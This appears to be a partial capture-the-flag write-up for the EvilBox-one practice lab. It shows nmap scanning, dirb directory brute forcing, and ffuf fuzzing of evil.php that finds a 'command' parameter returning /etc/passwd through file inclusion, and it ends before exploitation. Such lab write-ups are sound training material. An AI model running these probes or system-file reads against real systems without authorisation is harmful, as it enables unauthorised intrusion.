# PG Play: [EvilBox-one](https://portal.offensive-security.com/labs/play)

As usual we start by port scanning the machine:

Anyways to the port scanning:
```
nmap -p22,80 -sV -sC -T4 -Pn -oA 192.168.204.212 192.168.204.212
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-24 11:49 EDT
Nmap scan report for 192.168.204.212
Host is up (0.070s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 44:95:50:0b:e4:73:a1:85:11:ca:10:ec:1c:cb:d4:26 (RSA)
|   256 27:db:6a:c7:3a:9c:5a:0e:47:ba:8d:81:eb:d6:d6:3c (ECDSA)
|_  256 e3:07:56:a9:25:63:d4:ce:39:01:c1:9a:d9:fe:de:64 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Apache2 Debian Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.81 seconds
------------------------------------------------------------
Combined scan completed in 0:00:58.133619
```
We can see an SSH service running on the victim machine; the version is not vulnerable so we switch our efforts to the web page.

Our enumeration starts with directory brute forcing using [dirb](https://www.kali.org/tools/dirb/):
```
┌──(root💀kali)-[~/tryhackme/rooms/evilbox]
└─# dirb http://192.168.204.212/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Jul 24 11:50:20 2022
URL_BASE: http://192.168.204.212/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.204.212/ ----
+ http://192.168.204.212/index.html (CODE:200|SIZE:10701)                                                                                                                                                                                   
+ http://192.168.204.212/robots.txt (CODE:200|SIZE:12)                                                                                                                                                                                      
==> DIRECTORY: http://192.168.204.212/secret/                                                                                                                                                                                               
+ http://192.168.204.212/server-status (CODE:403|SIZE:280)                                                                                                                                                                                  
                                                                                                                                                                                                                                            
---- Entering directory: http://192.168.204.212/secret/ ----
^C> Testing: http://192.168.204.212/secret/editorials                                                                                                                                                                                       
                                                      
```
We find two interesting outputs: __robots.txt__ and __secret__

robots.txt contains the following:
```
┌──(root💀kali)-[~/tryhackme/rooms/evilbox]
└─# curl http://192.168.204.212/robots.txt       
Hello H4x0r
```
while the secret directory contains an empty web page so we further enumerate this directory:
```
┌──(root💀kali)-[~/tryhackme/rooms/evilbox]
└─# dirb http://192.168.204.212/secret -X .php

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Jul 24 12:07:26 2022
URL_BASE: http://192.168.204.212/secret/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
EXTENSIONS_LIST: (.php) | (.php) [NUM = 1]

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.204.212/secret/ ----
+ http://192.168.204.212/secret/evil.php (CODE:200|SIZE:0)
```
As we can see it contains an interesting file __evil.php__ but it's also an empty web page :(

Since there are no other paths I tried paramater fuzzing against __evil.php__
```
┌──(root💀kali)-[~/tryhackme/rooms/evilbox]
└─# ffuf -u 'http://192.168.204.212/secret/evil.php?FUZZ=/etc/passwd' -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -fs 0

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.204.212/secret/evil.php?FUZZ=/etc/passwd
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

command                 [Status: 200, Size: 1398, Words: 13, Lines: 27, Duration: 68ms]

```
It looks like we found a vulnerable parameter, let's try it against the web page:
